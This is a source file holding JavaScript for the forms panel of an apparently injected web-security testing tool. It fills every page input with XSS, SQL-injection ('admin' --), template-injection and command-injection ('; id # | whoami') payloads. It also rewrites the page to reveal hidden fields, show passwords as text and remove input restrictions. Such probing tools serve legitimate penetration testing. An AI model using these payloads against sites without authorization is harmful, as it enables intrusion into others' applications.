FORMS_TAB_JS = r"""
container.innerHTML = '';
                
                var hlBtn = document.createElement('button');
                hlBtn.innerText = window.__vulcanx_state.highlighting ? 'Disable Input Highlight' : 'Enable Input Highlight';
                hlBtn.style.width = '100%';
                hlBtn.style.padding = '8px';
                hlBtn.style.background = window.__vulcanx_state.highlighting ? '#800000' : '#006644';
                hlBtn.style.color = '#fff';
                hlBtn.style.border = 'none';
                hlBtn.style.borderRadius = '4px';
                hlBtn.style.cursor = 'pointer';
                hlBtn.style.fontWeight = 'bold';
                hlBtn.style.marginBottom = '12px';
                
                hlBtn.onclick = function() {
                    window.__vulcanx_state.highlighting = !window.__vulcanx_state.highlighting;
                    window.__vulcanx_toggle_inputs();
                    window.__vulcanx_render();
                };
                container.appendChild(hlBtn);

                var inputs = Array.from(document.querySelectorAll('input:not([type="hidden"]), textarea'));
                if (inputs.length === 0) {
                    var noInput = document.createElement('div');
                    noInput.style.color = '#666';
                    noInput.style.textAlign = 'center';
                    noInput.style.marginTop = '20px';
                    noInput.innerText = 'No input fields found on the current page.';
                    container.appendChild(noInput);
                    return;
                }

                var fillAllXSS = document.createElement('button');
                fillAllXSS.innerText = 'Fill All XSS';
                fillAllXSS.style.width = '30%';
                fillAllXSS.style.padding = '8px';
                fillAllXSS.style.background = '#440055';
                fillAllXSS.style.color = '#fff';
                fillAllXSS.style.border = '1px solid #ff00ff';
                fillAllXSS.style.borderRadius = '4px';
                fillAllXSS.style.cursor = 'pointer';
                fillAllXSS.style.fontWeight = 'bold';
                fillAllXSS.style.marginBottom = '12px';
                fillAllXSS.style.marginRight = '2%';
                fillAllXSS.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, '\"><script>alert(document.domain)</script>'); } else { input.value = '\"><script>alert(document.domain)</script>'; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '2px solid #ff00ff';
                    });
                };
                container.appendChild(fillAllXSS);
                
                var fillAllSQLi = document.createElement('button');
                fillAllSQLi.innerText = 'Fill All SQLi';
                fillAllSQLi.style.width = '30%';
                fillAllSQLi.style.padding = '8px';
                fillAllSQLi.style.background = '#331100';
                fillAllSQLi.style.color = '#fff';
                fillAllSQLi.style.border = '1px solid #ff5500';
                fillAllSQLi.style.borderRadius = '4px';
                fillAllSQLi.style.cursor = 'pointer';
                fillAllSQLi.style.fontWeight = 'bold';
                fillAllSQLi.style.marginBottom = '12px';
                fillAllSQLi.style.marginRight = '2%';
                fillAllSQLi.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '2px solid #ff5500';
                    });
                };
                container.appendChild(fillAllSQLi);
                
                var tamperDOM = document.createElement('button');
                tamperDOM.innerText = 'Tamper DOM (Reveal All)';
                tamperDOM.style.width = '100%';
                tamperDOM.style.padding = '8px';
                tamperDOM.style.background = '#004400';
                tamperDOM.style.color = '#00ff55';
                tamperDOM.style.border = '1px solid #00ff55';
                tamperDOM.style.borderRadius = '4px';
                tamperDOM.style.cursor = 'pointer';
                tamperDOM.style.fontWeight = 'bold';
                tamperDOM.style.marginBottom = '12px';
                tamperDOM.onclick = function() {
                    // Reveal hidden inputs, convert passwords to text, remove maxlengths and disabled attributes
                    var modifiedCount = 0;
                    document.querySelectorAll('input, select, textarea, button').forEach(el => {
                        if (el.type === 'hidden') {
                            el.type = 'text';
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.type === 'password') {
                            el.type = 'text';
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('disabled')) {
                            el.removeAttribute('disabled');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('readonly')) {
                            el.removeAttribute('readonly');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                        if (el.hasAttribute('maxlength')) {
                            el.removeAttribute('maxlength');
                            el.style.border = '2px solid #00ff55';
                            modifiedCount++;
                        }
                    });
                    if (modifiedCount > 0) {
                        alert("DOM Tampering Active! " + modifiedCount + " elements modified (revealed hidden fields, removed disabled/readonly/maxlength attributes).");
                    } else {
                        alert("No restricted DOM elements found to tamper with.");
                    }
                };
                container.appendChild(tamperDOM);

                var clearAll = document.createElement('button');
                clearAll.innerText = 'Clear Forms';
                clearAll.style.width = '30%';
                clearAll.style.padding = '8px';
                clearAll.style.background = '#222';
                clearAll.style.color = '#fff';
                clearAll.style.border = '1px solid #444';
                clearAll.style.borderRadius = '4px';
                clearAll.style.cursor = 'pointer';
                clearAll.style.fontWeight = 'bold';
                clearAll.style.marginBottom = '12px';
                clearAll.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, ""); } else { input.value = ""; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '';
                    });
                };
                container.appendChild(clearAll);


                var table = document.createElement('table');
                table.className = 'vx-table';
                table.innerHTML = `<thead>
                                    <tr>
                                        <th>Name/ID</th>
                                        <th>Type</th>
                                        <th>Actions</th>
                                    </tr>
                                   </thead>`;
                var tbody = document.createElement('tbody');
                inputs.forEach((input, index) => {
                    var identifier = input.name || input.id || `Input #${index+1}`;
                    var type = input.tagName === 'TEXTAREA' ? 'textarea' : (input.type || 'text');
                    
                    var tr = document.createElement('tr');
                    var tdName = document.createElement('td');
                    tdName.innerText = identifier;
                    tdName.style.color = '#aaa';
                    tr.appendChild(tdName);

                    var tdType = document.createElement('td');
                    tdType.innerText = type;
                    tr.appendChild(tdType);

                    var tdActions = document.createElement('td');
                    
                    var fillXSS = document.createElement('button');
                    fillXSS.innerText = 'Fill XSS';
                    fillXSS.style.fontSize = '9px';
                    fillXSS.style.marginRight = '4px';
                    fillXSS.style.background = '#440055';
                    fillXSS.style.border = '1px solid #ff00ff';
                    fillXSS.style.color = '#fff';
                    fillXSS.style.borderRadius = '3px';
                    fillXSS.style.cursor = 'pointer';
                    fillXSS.onclick = function() {
                        // Use a native value setter to bypass React's property descriptor overrides
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) {
                            setter.call(input, '\"><script>alert(document.domain)</script>');
                        } else {
                            input.value = '\"><script>alert(document.domain)</script>';
                        }
                        
                        // Dispatch events so frontend frameworks (React, Angular, Vue) register the change
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        
                        input.focus();
                        input.style.border = '2px solid #ff00ff';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillXSS);

                    var fillSQL = document.createElement('button');
                    fillSQL.innerText = 'Fill SQLi';
                    fillSQL.style.fontSize = '9px';
                    fillSQL.style.marginRight = '4px';
                    fillSQL.style.background = '#331100';
                    fillSQL.style.border = '1px solid #ff5500';
                    fillSQL.style.color = '#fff';
                    fillSQL.style.borderRadius = '3px';
                    fillSQL.style.cursor = 'pointer';
                    fillSQL.onclick = function() {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, "admin' --"); } else { input.value = "admin' --"; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #ff5500';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillSQL);

                    var fillSSTI = document.createElement('button');
                    fillSSTI.innerText = 'Fill SSTI';
                    fillSSTI.style.fontSize = '9px';
                    fillSSTI.style.marginRight = '4px';
                    fillSSTI.style.background = '#002244';
                    fillSSTI.style.border = '1px solid #0088ff';
                    fillSSTI.style.color = '#fff';
                    fillSSTI.style.borderRadius = '3px';
                    fillSSTI.style.cursor = 'pointer';
                    fillSSTI.onclick = function() {
                        var payload = "{{7*7}} ${7*7} <%= 7*7 %>";
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, payload); } else { input.value = payload; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #0088ff';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillSSTI);
                    
                    var fillCMDi = document.createElement('button');
                    fillCMDi.innerText = 'Fill CMDi';
                    fillCMDi.style.fontSize = '9px';
                    fillCMDi.style.background = '#113300';
                    fillCMDi.style.border = '1px solid #22ff00';
                    fillCMDi.style.color = '#fff';
                    fillCMDi.style.borderRadius = '3px';
                    fillCMDi.style.cursor = 'pointer';
                    fillCMDi.onclick = function() {
                        var payload = "; id # | whoami";
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, payload); } else { input.value = payload; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.focus();
                        input.style.border = '2px solid #22ff00';
                        input.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    };
                    tdActions.appendChild(fillCMDi);

                    tr.appendChild(tdActions);
                    tbody.appendChild(tr);
                });
                table.appendChild(tbody);
                container.appendChild(table);
"""
